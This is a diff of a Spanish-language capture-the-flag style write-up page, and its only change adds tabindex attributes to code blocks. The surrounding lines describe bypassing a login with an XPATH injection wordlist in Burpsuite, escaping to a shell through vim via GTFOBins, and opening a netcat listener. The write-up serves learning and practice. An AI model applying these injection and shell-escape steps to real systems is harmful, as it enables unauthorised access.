@@ -256,7 +256,7 @@ by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f9
 <p>Por lo tanto, utilicé <code>Burpsuite</code> para ver si con <a href=XPATH_list.txt>esta lista</a> puedo explotarlo :)</p>
 <p><img src=info_1.png alt=info_1></p>
 <p>Al verificar la longitud de las respuestas, una de ellas era diferente y omitimos la verificación, tambien obtuvimos un conjunto de 4 usuarios:contraseña</p>
-<pre><code>Username Password
+<pre tabindex=0><code>Username Password
 Tove [REDACTADO]
 Godzilla [REDACTADO]
 SuperMan [REDACTADO]
@@ -359,7 +359,7 @@ ideaBox
 </code></pre></div><p>Wow! ¡Nos está dando opciones para seleccionar!</p>
 <p>Probé con todas las opciones y descubrí que la opción 4 abre un editor <code>vim</code>, ¡así que puedo aprovecharme (en el buen sentido :\)!</p>
 <p>Con el siguiente código de <a href=https://gtfobins.github.io/gtfobins/vim/>GTFOBins</a>:</p>
-<pre><code>vim
+<pre tabindex=0><code>vim
 :set shell=/bin/sh #Yo usé bash :p
 :shell
 </code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ArthurMorgan@incognito:~$ nc -nlvp <span style=color:#ae81ff>4545</span>
